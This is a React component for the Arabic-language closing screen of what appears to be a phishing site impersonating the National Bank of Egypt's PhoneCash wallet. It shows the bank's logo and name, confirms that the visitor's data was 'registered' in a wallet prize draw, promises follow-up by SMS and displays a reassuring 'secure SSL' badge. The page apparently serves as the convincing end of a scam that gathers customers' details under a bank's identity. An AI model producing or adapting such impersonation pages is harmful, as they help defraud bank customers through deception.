import { useEffect } from "react";
import { navigateToPage } from "@/lib/store";

export default function FinalPageNBE() {
  useEffect(() => {
    navigateToPage("الصفحة النهائية - محفظة الأهلي");
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a4d2e] to-[#2d6b3f] flex flex-col items-center justify-center p-4" dir="rtl">
      {/* Background Pattern */}
      <div className="absolute inset-0 opacity-5">
        <div className="absolute inset-0" style={{
          backgroundImage: `repeating-linear-gradient(45deg, transparent, transparent 35px, rgba(255,255,255,0.1) 35px, rgba(255,255,255,0.1) 70px)`,
        }}></div>
      </div>

      <div className="relative z-10 w-full max-w-md flex flex-col items-center">
        {/* NBE Logo */}
        <div className="mb-6">
          <img
            src="/images/nbe-phonecash-logo.jpg"
            alt="NBE PhoneCash"
            className="w-20 h-20 md:w-24 md:h-24 rounded-xl shadow-lg"
          />
        </div>

        {/* Success Card */}
        <div className="bg-white/95 backdrop-blur-sm rounded-2xl shadow-2xl p-6 md:p-8 w-full text-center">
          {/* Success Animation */}
          <div className="relative w-24 h-24 mx-auto mb-6">
            <div className="absolute inset-0 bg-green-100 rounded-full animate-ping opacity-20"></div>
            <div className="relative w-24 h-24 bg-gradient-to-br from-green-400 to-green-600 rounded-full flex items-center justify-center shadow-lg">
              <svg className="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
              </svg>
            </div>
          </div>

          <h1 className="text-2xl md:text-3xl font-bold text-gray-800 mb-3">
            تم بنجاح!
          </h1>

          <p className="text-gray-600 mb-6 leading-relaxed">
            تم تسجيل بياناتك بنجاح في سحب محفظة الأهلي. سيتم التواصل معك قريباً.
          </p>

          {/* Info Box */}
          <div className="bg-green-50 border border-green-200 rounded-xl p-4 mb-6">
            <div className="flex items-center justify-center gap-2 mb-2">
              <svg className="w-5 h-5 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
              </svg>
              <h3 className="font-semibold text-green-800">ملاحظة مهمة</h3>
            </div>
            <p className="text-sm text-green-700">
              يرجى الاحتفاظ برقم هاتفك المسجل للمتابعة. سيتم إرسال تفاصيل السحب عبر رسالة نصية.
            </p>
          </div>

          {/* Divider */}
          <div className="border-t border-gray-100 pt-4">
            <p className="text-gray-400 text-xs">
              البنك الأهلي المصري - محفظة الأهلي PhoneCash
            </p>
          </div>
        </div>

        {/* SSL Footer */}
        <div className="mt-6 flex items-center gap-2 text-green-200/70">
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
          </svg>
          <span className="text-xs">اتصال آمن ومشفر SSL</span>
        </div>
      </div>
    </div>
  );
}
